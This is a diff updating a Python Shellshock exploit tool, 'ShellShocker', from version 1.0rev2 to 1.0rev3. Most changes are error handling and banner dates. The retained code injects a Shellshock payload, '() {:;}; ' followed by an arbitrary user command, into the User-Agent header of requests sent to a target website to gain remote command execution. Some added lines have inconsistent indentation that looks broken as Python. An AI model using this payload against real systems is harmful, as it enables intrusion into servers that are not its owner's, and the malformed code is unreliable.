@@ -10,17 +10,16 @@
 #################################                  #
 
 # Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
-# Last updated: [DD/MM/YYYY] 11/12/2014, [HH/MM] 00:10 AM
+# Last updated: [DD/MM/YYYY] 11/01/2015, [HH/MM] 03:34 PM # From 1.0rev3 data is correct
 # Status: initial release
 # support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
 # Be free! Open Source <(C)
-# Version: 1.0rev2
+# Version: 1.0rev3
 # Status: WORKING
 
 ##
 # TO-DO: -add exception: mechanize._response.httperror_seek_wrapper "attacker()"
-#        - handling robots.txt
-#        - add keyboardInterrupt for "retryIfNotReachable" 
+#        - handling robots.txt 
 ##
 
 #Modules
@@ -31,6 +30,8 @@ import sys
 len(sys.argv)
 
 #variables!
+global currentWorkDirectory
+currentWorkDirectory = os.getcwd()
 _licence_ = '''
 \033[33mShellShocker <(C) | WARNING
 ========================================
@@ -46,7 +47,7 @@ i ADVIDSED you.
 :::.::.:::.::.:..::.::::.....:::..:::.
 ========================================\033[0m
 '''
-version = "1.0rev2"
+version = "1.0rev3"
 status = "Working"
 
 __main__ = '''
@@ -77,7 +78,7 @@ ShellShocker <(C) | Exploit (Shell)
       \033[34mDeveloper: Stefano Belli (--developer for more info(s) )
       Script version: %s
       GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
-      Last updated: 11/12/2014 [DD/MM/YYYY] @ 00:10 PM\033[0m
+      Last updated: 11/01/2015 [DD/MM/YYYY] @ 03:34 PM\033[0m
 
 Usage: shellshocker.py \033[33m<option>
 
@@ -152,7 +153,7 @@ except ImportError:
                 os.system("apt-get install python-mechanize")
                 os.system("clear")
                 print(__welcome__)
-		exit(0)
+                exit(0)
             except KeyboardInterrupt:
                 os.system("clear")
                 print("\n{!} Quitted by Keyboard Shortcut\n\n")
@@ -180,19 +181,14 @@ except ImportError:
     except ImportError:
         print("[!} Supporting Android by QPython ~ TextualShell\n")
         pass
-    else:
-        exit(1)
 #Define mechanize values
 def defineMechanize():
     global br
     try:
-        br = mechanize.Browser()
+       br = mechanize.Browser()
     except NameError:
-        if exitValue == 0:
-            pass
-        elif exitValue == 1:
-            print("{\033[32minfo\033[0m} Bye!")
-            exit(1)
+       print("\033[33m{!!} Mechanize was not installed. Run this script by: %s"%currentWorkDirectory)
+       exit(1)
     br.addheaders = [('User-agent', '() {:;}; %s'%getCommand)]
     
 #Main screen 
@@ -213,6 +209,7 @@ def mainChooser():
     except SyntaxError:
         print("\033[31m{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer)\033[0m")
         exit(0)
+        
 
 #Attack
 def attacker():
@@ -228,22 +225,27 @@ def attacker():
             print("\033[31m{!} Error(s) happened, but maybe command was executed by bash shell\033[0m")
             print("\033[31mI cannot reach ERROR/EXCEPTION.\033[0m")
             exit(0)
-            
+    except NameError:
+        print("\033[31m{!!}Mechanize module not found! You need to install it. Run this script can help you, current working directory: %s"%currentWorkDirectory)
+        exit(0)
     except KeyboardInterrupt:
         print("\033[33m{!} User quitted [function: attacker() ]")
         exit(0)
     except mechanize._mechanize.BrowserStateError:
-        print("\033[31m{!} I cannot reach website.\033[0m")
-        retryOrNot = raw_input("\033[33m{?} Would you like to get back for retry?[Y/n]: \033[0m")
-        if retryOrNot == 'y':
-            os.system("clear")
-            print (_retry_)
-            mainChooser()
-            defineMechanize()
-            attacker()
-        else:
-            print("Bye bye!\nAnd remember... \033[31mW00t W00t i got r00t!\033[0m")
-            exit(0)
+      try:
+        	print("\033[31m{!} I cannot reach website.\033[0m")        
+        	retryOrNot = raw_input("\033[33m{?} Would you like to get back for retry?[Y/n]: \033[0m")
+        	if retryOrNot == 'y':
+           		os.system("clear")
+            	print (_retry_)
+                ###################
+            	mainChooser()
+            	defineMechanize()
+                attacker()
+                ###################
+      except KeyboardInterrupt:
+        	print("{!} User quitted!\n")
+          	exit(0)
             
 ####EXECUTE####
 mainChooser()     
